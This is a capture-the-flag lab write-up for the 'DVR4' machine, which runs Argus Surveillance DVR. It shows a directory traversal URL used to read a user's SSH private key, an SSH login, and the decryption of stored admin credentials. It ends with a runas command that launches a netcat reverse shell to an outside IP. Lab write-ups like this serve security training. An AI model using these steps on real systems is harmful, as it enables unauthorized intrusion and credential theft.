# DVR4 -  Writeup
## Initial Enumeration
### Port Scanning
The target has several open ports, with the most interesting being port 8080 where a web server is running.
### Web Server Enumeration (Port 8080)
Initial directory discovery revealed several web pages related to a camera system:
```
200 GET    42l    88w  1198c http://192.168.185.179:8080/pda/Cameras.html
200 GET    42l    88w  1187c http://192.168.185.179:8080/pda/cam80x60.html
200 GET    75l   218w  2349c http://192.168.185.179:8080/CamerasBottomFrame.html
200 GET    82l   245w  2706c http://192.168.185.179:8080/ActiveXIFrame.html
200 GET   655l  1718w 29575c http://192.168.185.179:8080/CamerasTopFrame.html
200 GET    23l    73w   985c http://192.168.185.179:8080/
200 GET    45l    92w  1256c http://192.168.185.179:8080/pda/cam320x240.html
200 GET    42l    88w  1195c http://192.168.185.179:8080/pda
```
### Local File Inclusion (LFI) Discovery
After testing various endpoints, I discovered a vulnerable LFI parameter on the Cameras.html page:
```
http://192.168.185.179:8080/pda/Cameras.html?RESULTPAGE=../../../../../../../../
```
This allowed for traversing the file system. Extensive LFI testing revealed numerous accessible files including:
- System configuration files
- Windows logs
- User directories
## Exploitation
### Credentials via SSH Key
Using the LFI vulnerability, I was able to view the SSH private key for the "Viewer" user:
```
http://192.168.185.179:8080/pda/Cameras.html?RESULTPAGE=../../../../../../../../Users/Viewer/.ssh/id_rsa
```
I downloaded this key, set appropriate permissions, and logged in via SSH:
```bash
chmod 600 id_rsa
ssh -i id_rsa Viewer@192.168.185.179
```
### Privilege Escalation
#### Information Gathering
After gaining initial access as the Viewer user, I explored the system and identified that the machine was running Argus Surveillance DVR software.
#### Password Decryption
The Argus DVR software uses weak password encryption. Located configuration file containing encrypted credentials:
```
C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini
```
Using publicly available information about Argus DVR's encryption method, I was able to decrypt the administrator password.
#### Administrator Access
With the administrator credentials, I used the runas command to gain a privileged reverse shell:
```
runas /user:administrator "C:\users\viewer\desktop\nc.exe -e cmd.exe 192.168.49.57 443"
```
This gave me a reverse shell with SYSTEM privileges, allowing complete control of the machine.

